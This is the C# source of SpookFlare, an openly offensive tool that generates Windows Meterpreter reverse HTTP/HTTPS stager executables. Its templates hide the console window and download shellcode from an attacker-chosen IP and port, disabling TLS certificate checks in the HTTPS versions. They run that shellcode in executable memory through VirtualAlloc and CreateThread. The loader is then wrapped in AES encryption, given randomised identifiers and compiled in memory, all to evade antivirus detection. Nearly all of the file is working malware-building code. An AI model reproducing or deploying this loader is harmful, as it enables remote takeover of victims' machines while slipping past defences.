/*
     ___ ___  ___   ___  _  __  ___ _      _   ___ ___ 
    / __| _ \/ _ \ / _ \| |/ / | __| |    /_\ | _ \ __|
    \__ \  _/ (_) | (_) | ' <  | _|| |__ / _ \|   / _| 
    |___/_|  \___/ \___/|_|\_\ |_| |____/_/ \_\_|_\___|

    This program was developed for penetration tests and red team engagements.
    SpookFlare is purely educational. Please use with responsibility.

    Version    : 1.0
    Author     : Halil Dalabasmaz
    WWW        : artofpwn.com
    Twitter    : @hlldz
    Github     : @hlldz
    Licence    : Apache License 2.0
    Note       : Stay in shadows!

*/

using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace SpookFlare
{
    class Program
    {
        static void displayBanner()
        {

            string banner = @"
     ___ ___  ___   ___  _  __  ___ _      _   ___ ___ 
    / __| _ \/ _ \ / _ \| |/ / | __| |    /_\ | _ \ __|
    \__ \  _/ (_) | (_) | ' <  | _|| |__ / _ \|   / _| 
    |___/_|  \___/ \___/|_|\_\ |_| |____/_/ \_\_|_\___|";

            string info = @"
    Version    : 1.0
    Author     : Halil Dalabasmaz
    WWW        : artofpwn.com
    Twitter    : @hlldz
    Github     : @hlldz
    Licence    : Apache License 2.0
    Note       : Stay in shadows!

    -------------------------------------------------------";

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(banner);
            Console.ResetColor();
            Console.ForegroundColor = ConsoleColor.White;

            Console.WriteLine(info);
            Console.WriteLine("\n    [*] You can use \"help\" command for access help section.\n");
        }
        static void helpSection()
        {
            string helpSection = @"
    list     : List payloads
    generate : Generate payloads
    exit     : Exit from program
    
    [!] Important: Use x86 listener for x86 payloads and x64 listener for x64 payloads otherwise the process will crash!";
            Console.WriteLine(helpSection + "\n");
        }
        static void payloadList()
        {
            string payloadList = @"
    SpookFlare can generate following payloads.

    [*]  Meterpreter Loader (.EXE) with Custom Encrypter and Custom Stub:

        - Meterpreter Reverse HTTP x86/x64
        - Meterpreter Reverse HTTPS x86/x64
";
            Console.WriteLine(payloadList);
        }
        static void generator()
        {
            Console.Write("\n    [*] Type http for Reverse HTTP and type https for Reverse HTTPS\n");

            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("\n    Protocol > ");
            Console.ResetColor();
            Console.ForegroundColor = ConsoleColor.White;
            string protocol = Console.ReadLine();

            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("\n    IP Address [x.x.x.x] > ");
            Console.ResetColor();
            Console.ForegroundColor = ConsoleColor.White;
            string ipAddress = Console.ReadLine();

            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("\n    Port Number [x-xxxxx] > ");
            Console.ResetColor();
            Console.ForegroundColor = ConsoleColor.White;
            string portNumber = Console.ReadLine();

            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("\n    Target Architecture [x86 or x64] > ");
            Console.ResetColor();
            Console.ForegroundColor = ConsoleColor.White;
            string architecture = Console.ReadLine();

            Console.Write("\n    [*] If you patched Metasploit please enter the byte size or enter 0 (zero).\n");

            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("\n    Stage Patch Size > ");
            Console.ResetColor();
            Console.ForegroundColor = ConsoleColor.White;
            string randomByteSize = Console.ReadLine();

            Console.WriteLine("\n    [*] Checking values...");

            if (protocol == "http" && architecture == "x86") { firstProcess(protocol, ipAddress, portNumber, architecture, randomByteSize); }
            else if (protocol == "http" && architecture == "x64") { firstProcess(protocol, ipAddress, portNumber, architecture, randomByteSize); }
            else if (protocol == "https" && architecture == "x86") { firstProcess(protocol, ipAddress, portNumber, architecture, randomByteSize); }
            else if (protocol == "https" && architecture == "x64") { firstProcess(protocol, ipAddress, portNumber, architecture, randomByteSize); }
            else { Console.WriteLine("\n    [!] Values are not valid!\n"); }
        }
        static string generateRandomString(int length, Random random)
        {
            string characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            StringBuilder result = new StringBuilder(length);
            for (int i = 0; i < length; i++)
            {
                result.Append(characters[random.Next(characters.Length)]);
            }
            return result.ToString();
        }
        public static byte[] encryption(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {

            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 7, 3, 3, 1, 1, 3, 3, 7 };

            using (MemoryStream ms = new MemoryStream())
            {

                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }
        static string encryptPayload(string input, string password)
        {

            byte[] bytesToBeEncrypted = Encoding.UTF8.GetBytes(input);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
            byte[] bytesEncrypted = encryption(bytesToBeEncrypted, passwordBytes);
            string result = Convert.ToBase64String(bytesEncrypted);
            return result;
        }
        static void firstProcess(string protocol, string ipAddress, string portNumber, string architecture, string randomByteSize)
        {

            if (protocol == "http" && architecture == "x86")
            {
                Random rnd = new Random();
                string str0 = "l04d3r";
                string str1 = "Pr0gr4m";
                string str2 = "UInt32";
                string str3 = generateRandomString(12, rnd);
                string str4 = generateRandomString(12, rnd);
                string str5 = generateRandomString(12, rnd);
                string str6 = generateRandomString(12, rnd);
                string str7 = generateRandomString(12, rnd);
                string str8 = generateRandomString(12, rnd);
                string str9 = generateRandomString(12, rnd);
                string str10 = generateRandomString(12, rnd);
                string str11 = generateRandomString(12, rnd);
                string str12 = generateRandomString(12, rnd);
                string str13 = generateRandomString(12, rnd);
                string str14 = generateRandomString(12, rnd);
                string str15 = generateRandomString(12, rnd);
                string str16 = generateRandomString(12, rnd);
                string str17 = " ";
                string str18 = generateRandomString(12, rnd);
                string str19 = generateRandomString(12, rnd);
                string str20 = generateRandomString(12, rnd);
                string str21 = generateRandomString(12, rnd);
                string str22 = generateRandomString(12, rnd);
                string str23 = generateRandomString(12, rnd);
                string str24 = generateRandomString(12, rnd);
                string str25 = "http";
                string str26 = ipAddress;
                string str27 = portNumber;
                string str28 = "PXAs";
                string str29 = randomByteSize;
                string privateKey = generateRandomString(16, rnd);

                string reverseHttpCodeX86 = string.Format((@"using System; using System.Net; using System.Runtime.InteropServices;
namespace {0} {{ public class {1} {{
        [DllImport(""kernel32"")]
        private static extern {2} VirtualAlloc({2} {3}, {2} {4}, {2} {5}, {2} {6});
        [DllImport(""kernel32"")]
        private static extern IntPtr CreateThread({2} {7}, {2} {8}, {2} {9}, IntPtr {10}, {2} {11}, ref {2} {12});
        [DllImport(""kernel32"")]
        private static extern {2} WaitForSingleObject(IntPtr {13}, {2} {14});
        [DllImport(""kernel32.dll"")]
        static extern IntPtr GetConsoleWindow();
        [DllImport(""user32.dll"")]
        static extern bool ShowWindow(IntPtr {15}, int {16});
        public static void Main(){{ ShowWindow(GetConsoleWindow(), 0); {17} WebClient {18} = new System.Net.WebClient(); {18}.Headers.Add(""User-Agent"", ""Mozilla/5.0 (compatible; MSIE 11.0; Trident/7.0; rv:11.0)""); {18}.Headers.Add(""Accept"", ""*/*""); {18}.Headers.Add(""Accept-Language"", ""en-gb,en;q=0.5""); byte[] {19} = null; {19} = {18}.DownloadData(""{25}://{26}:{27}/{28}""); byte[] {20} = new byte[{19}.Length - {29}]; Array.Copy({19}, {29}, {20}, 0, {20}.Length); {2} {21} = VirtualAlloc(0, ({2}){20}.Length, 0x1000, 0x40); Marshal.Copy({20}, 0, (IntPtr)({21}), {20}.Length); IntPtr {22} = IntPtr.Zero; {2} {23} = 0; IntPtr {24} = IntPtr.Zero; {22} = CreateThread(0, 0, {21}, {24}, 0, ref {23}); WaitForSingleObject({22}, 0xFFFFFFFF); }} }} }}"), str0, str1, str2, str3, str4, str5, str6, str7, str8, str9, str10, str11, str12, str13, str14, str15, str16, str17, str18, str19, str20, str21, str22, str23, str24, str25, str26, str27, str28, str29);

                string encryptedLoader = encryptPayload(reverseHttpCodeX86, privateKey);
                secondProcess("x86", encryptedLoader, privateKey);
            }

            else if (protocol == "http" && architecture == "x64")
            {
                Random rnd = new Random();
                string str0 = "l04d3r";
                string str1 = "Pr0gr4m";
                string str2 = "UInt64";
                string str3 = generateRandomString(12, rnd);
                string str4 = generateRandomString(12, rnd);
                string str5 = generateRandomString(12, rnd);
                string str6 = generateRandomString(12, rnd);
                string str7 = generateRandomString(12, rnd);
                string str8 = generateRandomString(12, rnd);
                string str9 = generateRandomString(12, rnd);
                string str10 = generateRandomString(12, rnd);
                string str11 = generateRandomString(12, rnd);
                string str12 = generateRandomString(12, rnd);
                string str13 = generateRandomString(12, rnd);
                string str14 = generateRandomString(12, rnd);
                string str15 = generateRandomString(12, rnd);
                string str16 = generateRandomString(12, rnd);
                string str17 = " ";
                string str18 = generateRandomString(12, rnd);
                string str19 = generateRandomString(12, rnd);
                string str20 = generateRandomString(12, rnd);
                string str21 = generateRandomString(12, rnd);
                string str22 = generateRandomString(12, rnd);
                string str23 = generateRandomString(12, rnd);
                string str24 = generateRandomString(12, rnd);
                string str25 = "http";
                string str26 = ipAddress;
                string str27 = portNumber;
                string str28 = "PXAs";
                string str29 = randomByteSize;
                string privateKey = generateRandomString(16, rnd);

                string reverseHttpCodeX64 = string.Format((@"using System; using System.Net; using System.Runtime.InteropServices;
namespace {0} {{ public class {1} {{
        [DllImport(""kernel32"")]
        private static extern {2} VirtualAlloc({2} {3}, {2} {4}, {2} {5}, {2} {6});
        [DllImport(""kernel32"")]
        private static extern IntPtr CreateThread({2} {7}, {2} {8}, {2} {9}, IntPtr {10}, {2} {11}, ref {2} {12});
        [DllImport(""kernel32"")]
        private static extern {2} WaitForSingleObject(IntPtr {13}, {2} {14});
        [DllImport(""kernel32.dll"")]
        static extern IntPtr GetConsoleWindow();
        [DllImport(""user32.dll"")]
        static extern bool ShowWindow(IntPtr {15}, int {16});
        public static void Main(){{ ShowWindow(GetConsoleWindow(), 0); {17} WebClient {18} = new System.Net.WebClient(); {18}.Headers.Add(""User-Agent"", ""Mozilla/5.0 (compatible; MSIE 11.0; Trident/7.0; rv:11.0)""); {18}.Headers.Add(""Accept"", ""*/*""); {18}.Headers.Add(""Accept-Language"", ""en-gb,en;q=0.5""); byte[] {19} = null; {19} = {18}.DownloadData(""{25}://{26}:{27}/{28}""); byte[] {20} = new byte[{19}.Length - {29}]; Array.Copy({19}, {29}, {20}, 0, {20}.Length); {2} {21} = VirtualAlloc(0, ({2}){20}.Length, 0x1000, 0x40); Marshal.Copy({20}, 0, (IntPtr)({21}), {20}.Length); IntPtr {22} = IntPtr.Zero; {2} {23} = 0; IntPtr {24} = IntPtr.Zero; {22} = CreateThread(0, 0, {21}, {24}, 0, ref {23}); WaitForSingleObject({22}, 0xFFFFFFFF); }} }} }}"), str0, str1, str2, str3, str4, str5, str6, str7, str8, str9, str10, str11, str12, str13, str14, str15, str16, str17, str18, str19, str20, str21, str22, str23, str24, str25, str26, str27, str28, str29);

                string encryptedLoader = encryptPayload(reverseHttpCodeX64, privateKey);
                secondProcess("x64", encryptedLoader, privateKey);
            }

            else if (protocol == "https" && architecture == "x86")
            {
                Random rnd = new Random();
                string str0 = "l04d3r";
                string str1 = "Pr0gr4m";
                string str2 = "UInt32";
                string str3 = generateRandomString(12, rnd);
                string str4 = generateRandomString(12, rnd);
                string str5 = generateRandomString(12, rnd);
                string str6 = generateRandomString(12, rnd);
                string str7 = generateRandomString(12, rnd);
                string str8 = generateRandomString(12, rnd);
                string str9 = generateRandomString(12, rnd);
                string str10 = generateRandomString(12, rnd);
                string str11 = generateRandomString(12, rnd);
                string str12 = generateRandomString(12, rnd);
                string str13 = generateRandomString(12, rnd);
                string str14 = generateRandomString(12, rnd);
                string str15 = generateRandomString(12, rnd);
                string str16 = generateRandomString(12, rnd);
                string str17 = "ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;";
                string str18 = generateRandomString(12, rnd);
                string str19 = generateRandomString(12, rnd);
                string str20 = generateRandomString(12, rnd);
                string str21 = generateRandomString(12, rnd);
                string str22 = generateRandomString(12, rnd);
                string str23 = generateRandomString(12, rnd);
                string str24 = generateRandomString(12, rnd);
                string str25 = "https";
                string str26 = ipAddress;
                string str27 = portNumber;
                string str28 = "PXAs";
                string str29 = randomByteSize;
                string privateKey = generateRandomString(16, rnd);

                string reverseHttpsCodeX86 = string.Format((@"using System; using System.Net; using System.Runtime.InteropServices;
namespace {0} {{ public class {1} {{
        [DllImport(""kernel32"")]
        private static extern {2} VirtualAlloc({2} {3}, {2} {4}, {2} {5}, {2} {6});
        [DllImport(""kernel32"")]
        private static extern IntPtr CreateThread({2} {7}, {2} {8}, {2} {9}, IntPtr {10}, {2} {11}, ref {2} {12});
        [DllImport(""kernel32"")]
        private static extern {2} WaitForSingleObject(IntPtr {13}, {2} {14});
        [DllImport(""kernel32.dll"")]
        static extern IntPtr GetConsoleWindow();
        [DllImport(""user32.dll"")]
        static extern bool ShowWindow(IntPtr {15}, int {16});
        public static void Main(){{ ShowWindow(GetConsoleWindow(), 0); {17} WebClient {18} = new System.Net.WebClient(); {18}.Headers.Add(""User-Agent"", ""Mozilla/5.0 (compatible; MSIE 11.0; Trident/7.0; rv:11.0)""); {18}.Headers.Add(""Accept"", ""*/*""); {18}.Headers.Add(""Accept-Language"", ""en-gb,en;q=0.5""); byte[] {19} = null; {19} = {18}.DownloadData(""{25}://{26}:{27}/{28}""); byte[] {20} = new byte[{19}.Length - {29}]; Array.Copy({19}, {29}, {20}, 0, {20}.Length); {2} {21} = VirtualAlloc(0, ({2}){20}.Length, 0x1000, 0x40); Marshal.Copy({20}, 0, (IntPtr)({21}), {20}.Length); IntPtr {22} = IntPtr.Zero; {2} {23} = 0; IntPtr {24} = IntPtr.Zero; {22} = CreateThread(0, 0, {21}, {24}, 0, ref {23}); WaitForSingleObject({22}, 0xFFFFFFFF); }} }} }}"), str0, str1, str2, str3, str4, str5, str6, str7, str8, str9, str10, str11, str12, str13, str14, str15, str16, str17, str18, str19, str20, str21, str22, str23, str24, str25, str26, str27, str28, str29);

                string encryptedLoader = encryptPayload(reverseHttpsCodeX86, privateKey);
                secondProcess("x86", encryptedLoader, privateKey);
            }

            else if (protocol == "https" && architecture == "x64")
            {
                Random rnd = new Random();
                string str0 = "l04d3r";
                string str1 = "Pr0gr4m";
                string str2 = "UInt64";
                string str3 = generateRandomString(12, rnd);
                string str4 = generateRandomString(12, rnd);
                string str5 = generateRandomString(12, rnd);
                string str6 = generateRandomString(12, rnd);
                string str7 = generateRandomString(12, rnd);
                string str8 = generateRandomString(12, rnd);
                string str9 = generateRandomString(12, rnd);
                string str10 = generateRandomString(12, rnd);
                string str11 = generateRandomString(12, rnd);
                string str12 = generateRandomString(12, rnd);
                string str13 = generateRandomString(12, rnd);
                string str14 = generateRandomString(12, rnd);
                string str15 = generateRandomString(12, rnd);
                string str16 = generateRandomString(12, rnd);
                string str17 = "ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;";
                string str18 = generateRandomString(12, rnd);
                string str19 = generateRandomString(12, rnd);
                string str20 = generateRandomString(12, rnd);
                string str21 = generateRandomString(12, rnd);
                string str22 = generateRandomString(12, rnd);
                string str23 = generateRandomString(12, rnd);
                string str24 = generateRandomString(12, rnd);
                string str25 = "https";
                string str26 = ipAddress;
                string str27 = portNumber;
                string str28 = "PXAs";
                string str29 = randomByteSize;
                string privateKey = generateRandomString(16, rnd);

                string reverseHttpsCodeX64 = string.Format((@"using System; using System.Net; using System.Runtime.InteropServices;
namespace {0} {{ public class {1} {{
        [DllImport(""kernel32"")]
        private static extern {2} VirtualAlloc({2} {3}, {2} {4}, {2} {5}, {2} {6});
        [DllImport(""kernel32"")]
        private static extern IntPtr CreateThread({2} {7}, {2} {8}, {2} {9}, IntPtr {10}, {2} {11}, ref {2} {12});
        [DllImport(""kernel32"")]
        private static extern {2} WaitForSingleObject(IntPtr {13}, {2} {14});
        [DllImport(""kernel32.dll"")]
        static extern IntPtr GetConsoleWindow();
        [DllImport(""user32.dll"")]
        static extern bool ShowWindow(IntPtr {15}, int {16});
        public static void Main(){{ ShowWindow(GetConsoleWindow(), 0); {17} WebClient {18} = new System.Net.WebClient(); {18}.Headers.Add(""User-Agent"", ""Mozilla/5.0 (compatible; MSIE 11.0; Trident/7.0; rv:11.0)""); {18}.Headers.Add(""Accept"", ""*/*""); {18}.Headers.Add(""Accept-Language"", ""en-gb,en;q=0.5""); byte[] {19} = null; {19} = {18}.DownloadData(""{25}://{26}:{27}/{28}""); byte[] {20} = new byte[{19}.Length - {29}]; Array.Copy({19}, {29}, {20}, 0, {20}.Length); {2} {21} = VirtualAlloc(0, ({2}){20}.Length, 0x1000, 0x40); Marshal.Copy({20}, 0, (IntPtr)({21}), {20}.Length); IntPtr {22} = IntPtr.Zero; {2} {23} = 0; IntPtr {24} = IntPtr.Zero; {22} = CreateThread(0, 0, {21}, {24}, 0, ref {23}); WaitForSingleObject({22}, 0xFFFFFFFF); }} }} }}"), str0, str1, str2, str3, str4, str5, str6, str7, str8, str9, str10, str11, str12, str13, str14, str15, str16, str17, str18, str19, str20, str21, str22, str23, str24, str25, str26, str27, str28, str29);

                string encryptedLoader = encryptPayload(reverseHttpsCodeX64, privateKey);
                secondProcess("x64", encryptedLoader, privateKey);
            }
        }
        static void secondProcess(string architecture, string encyrtedLoaderCode, string privateKey)
        {
            Random rnd = new Random();
            string str0 = encyrtedLoaderCode;
            string str1 = privateKey;
            string str2 = generateRandomString(12, rnd);
            string str3 = generateRandomString(12, rnd);
            string str4 = generateRandomString(12, rnd);
            string str5 = generateRandomString(12, rnd);
            string str6 = generateRandomString(12, rnd);
            string str7 = generateRandomString(12, rnd);
            string str8 = generateRandomString(12, rnd);
            string str9 = generateRandomString(12, rnd);
            string str10 = generateRandomString(12, rnd);
            string str11 = generateRandomString(12, rnd);
            string str12 = generateRandomString(12, rnd);
            string str13 = generateRandomString(12, rnd);
            string str14 = generateRandomString(12, rnd);
            string str15 = generateRandomString(12, rnd);
            string str16 = generateRandomString(12, rnd);
            string str17 = generateRandomString(12, rnd);
            string str18 = generateRandomString(12, rnd);
            string str19 = generateRandomString(12, rnd);
            string str20 = generateRandomString(12, rnd);
            string str21 = generateRandomString(12, rnd);

            string finalCode = string.Format((@"using System.Security.Cryptography;using System.IO;using System.Text;using System;using System.Reflection;using Microsoft.CSharp;using System.CodeDom.Compiler;
namespace {2} {{
    class {3} {{
        public static byte[] {4}(byte[] {5}, byte[] {6}) {{ byte[] {7} = null; byte[] {8} = new byte[] {{ 7, 3, 3, 1, 1, 3, 3, 7 }}; using (MemoryStream {9} = new MemoryStream()) {{ using (RijndaelManaged {10} = new RijndaelManaged()) {{ {10}.KeySize = 256; {10}.BlockSize = 128; var key = new Rfc2898DeriveBytes({6}, {8}, 1000); {10}.Key = key.GetBytes({10}.KeySize / 8); {10}.IV = key.GetBytes({10}.BlockSize / 8); {10}.Mode = CipherMode.CBC; using (var cs = new CryptoStream({9}, {10}.CreateDecryptor(), CryptoStreamMode.Write)) {{ cs.Write({5}, 0, {5}.Length); cs.Close(); }} {7} = {9}.ToArray(); }} }} return {7}; }}
        public static string {11}(string {12}, string {13}) {{ byte[] {5} = Convert.FromBase64String({12}); byte[] {6} = Encoding.UTF8.GetBytes({13}); {6} = SHA256.Create().ComputeHash({6}); byte[] {14} = {4}({5}, {6}); string result = Encoding.UTF8.GetString({14}); return result; }}
        static void Main() {{ string {15} = {11}(""{0}"", ""{1}""); CSharpCodeProvider {16} = new CSharpCodeProvider(); CompilerParameters {17} = new CompilerParameters(new[] {{ ""mscorlib.dll"", ""System.Core.dll"", ""System.dll"" }}); {17}.GenerateInMemory = true; {17}.ReferencedAssemblies.Add(Assembly.GetEntryAssembly().Location); CompilerResults {18} = {16}.CompileAssemblyFromSource({17}, {15}); Assembly {20} = {18}.CompiledAssembly; Type {19} = {20}.GetType(""l04d3r.Pr0gr4m""); MethodInfo {21} = {19}.GetMethod(""Main""); {21}.Invoke(null, null); }} }} }}"), str0, str1, str2, str3, str4, str5, str6, str7, str8, str9, str10, str11, str12, str13, str14, str15, str16, str17, str18, str19, str20, str21);
            compiler(architecture, finalCode);
        }
        static void compiler(string architecture, string code)
        {

            Random rnd = new Random();
            string fileName = generateRandomString(10, rnd);
            string arch = " /platform:" + architecture;

            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll", "System.dll" }, fileName + ".exe", true);
            parameters.GenerateExecutable = true;
            parameters.CompilerOptions = arch;
            parameters.IncludeDebugInformation = false;
            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);

            if (results.Errors.HasErrors)
            {
                StringBuilder sb = new StringBuilder();

                foreach (CompilerError error in results.Errors)
                {
                    sb.AppendLine(String.Format("Error ({0}): {1}", error.ErrorNumber, error.ErrorText));
                }
                throw new InvalidOperationException(sb.ToString());
            }
            Console.WriteLine("\n    [!] Payload successfully generated: " + System.IO.Directory.GetCurrentDirectory() + "\\" + fileName + ".exe\n");
        }
        static void Main(string[] args)
        {

            Console.Title = "SpookFlare v1.0";

            displayBanner();

            while (true)
            {

                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("    spookflare > ");
                Console.ResetColor();
                Console.ForegroundColor = ConsoleColor.White;
                string command = Console.ReadLine();

                if (command == "exit") { Environment.Exit(0); }
                else if (command == "help") { helpSection(); }
                else if (command == "list") { payloadList(); }
                else if (command == "generate") { generator(); }
            }
        }
    }
}